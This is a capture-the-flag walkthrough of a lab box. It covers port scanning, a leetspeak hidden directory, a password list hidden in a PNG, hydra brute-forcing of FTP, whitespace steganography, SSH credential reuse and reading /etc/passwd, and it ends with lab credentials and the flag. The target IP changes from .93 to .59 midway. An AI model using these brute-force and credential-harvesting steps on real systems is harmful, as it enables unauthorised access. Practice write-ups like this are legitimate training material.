# Musa Troglodytarum

## Techniques used

- Web source/comment enumeration
- Leetspeak decoding
- Directory bruteforce
- PNG data analysis
- SSH login reuse

## Tools used

- nmap
- curl
- dirb
- lftp
- ssh
- hydra
- python3

## Commands and output

### 1. Port scan

```bash
$ nmap -Pn -p- --min-rate 2000 -T4 10.10.0.93
```

```text
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
```

### 2. Web enumeration

The default Apache page CSS stylesheet contains a hidden HTML/CSS comment:

```text
/* Nice to see someone checking the stylesheets.
   Take a look at the page: /l3_B4n4N13r_D3s_M0nT4gN3s.php
*/
```

### 3. Following the redirect chain

```bash
$ curl -i "http://10.10.0.93/l3_B4n4N13r_D3s_M0nT4gN3s.php"
```

```text
HTTP/1.1 302 Found
Location: intermediary.php?hidden_directory=/L3s_Fru1ts_s0nt_c0NNus_Gen3raL3m3nt_s0Us_l3_N0m_D3_B4N4n3
```

### 4. Finding the hidden directory

```bash
$ curl -i "http://10.10.0.93/intermediary.php?hidden_directory=/L3s_Fru1ts_s0nt_c0NNus_Gen3raL3m3nt_s0Us_l3_N0m_D3_B4N4n3"
```

Visiting that decoded path directly reveals a browsable directory:

```text
Index of /L3s_Fru1ts_s0nt_c0NNus_Gen3raL3m3nt_s0Us_l3_N0m_D3_B4N4n3
Hot_Babe.png    262K
```

### 5. Extracting the hidden message from the PNG

```bash
$ curl -s -o Hot_Babe.png "http://10.10.0.93/L3s_Fru1ts_s0nt_c0NNus_Gen3raL3m3nt_s0Us_l3_N0m_D3_B4N4n3/Hot_Babe.png"
$ strings -a Hot_Babe.png | grep -A2 "earned this"
```

```text
Eh, you've earned this. Username for FTP is banane_celeste
One of these is the password:
iVBORw0KGgoAAAANSUhE
...(~200 lines total)...
```

One of the 200 raw lines is the actual password.

### 6. Cracking the password list

```bash
$ grep -a -A300 "One of these is the password:" Hot_Babe.png | tail -n +2 > candidates.txt
$ hydra -l banane_celeste -P candidates.txt ftp://10.10.0.93
```

```text
[21][ftp] host: 10.10.0.93   login: banane_celeste   password: gPKTq8qo+MzagarcIxgO
```

### 7. FTP login and credential pivot

```bash
$ lftp banane_celeste:'gPKTq8qo+MzagarcIxgO'@10.10.0.93
$ ls -la
```

```text
-rw-r--r-- 1 1002 1002 1073 Jul 23 13:42 Valerian's_Creds.txt
```

The file's visible text is a Rumphius/botany paragraph, with the `banane_celeste` username, but most of the file is whitespace.

### 8. Whitespace steganography

Each data line encodes one ASCII character in its **last 8 characters** (space = `0`, tab = `1`):

```bash
$ python3 -c "
print(''.join(chr(int(''.join('1' if c=='\t' else '0' for c in l[-8:]),2)) for l in open(\"Valerian's_Creds.txt\").read().split('Le botaniste')[0].split(chr(10)) if len(l)>=8))
"
```

```text
User: valerian
Password: T4k_t4k_S0lide_Dyn0_int0_Cr1mP
```

### 9. SSH login as valerian

```bash
$ ssh valerian@10.10.0.59
Password: T4k_t4k_S0lide_Dyn0_int0_Cr1mP
```

```text
Message from the solid bros:
"Hi, just a reminder that in case of need, check our """s3cr3t""" hiding place."
```

### 10. Finding the next credential

```bash
$ find / -iname "*s3cr3t*" 2>/dev/null
```

```text
/usr/games/s3cr3t
```
```bash
$ cd /usr/games/s3cr3t/ && ls -la
```
```bash
$ cat /usr/games/s3cr3t/.msg_fr0m_v4l3r14n
```

```text
Yo gab,
Careful about your password, IT said that it isn't secured enough!
Honestly I think that "ca_serait_jamais_arrive_en_haskell" is fine, but whatever, just letting you know!

Solidement votre,
    -Valerian
```

### 11. Identifying the real username

```bash
$ cat /etc/passwd | grep -i gab
```

```text
gabriel:x:1000:1000::/home/gabriel:/bin/bash
```

### 12. SSH login as gabriel and reading user.txt

```bash
$ ssh gabriel@10.10.0.59
Password: ca_serait_jamais_arrive_en_haskell
$ ls -la
$ cat note.txt
$ cat user.txt
```

```text
I haven't find a way to update that specific package...
Oh well, old is retro right? And retro is hype, right?

EPI{l3_7R0nC_3S7_3N_R34Li73_un_PS3ud0_7r0NC_InCR0ya8Le}
```


## Evidence

- FTP: `banane_celeste` / `gPKTq8qo+MzagarcIxgO`
- SSH: `valerian` / `T4k_t4k_S0lide_Dyn0_int0_Cr1mP`
- SSH: `gabriel` / `ca_serait_jamais_arrive_en_haskell`
- Flag: `EPI{l3_7R0nC_3S7_3N_R34Li73_un_PS3ud0_7r0NC_InCR0ya8Le}`
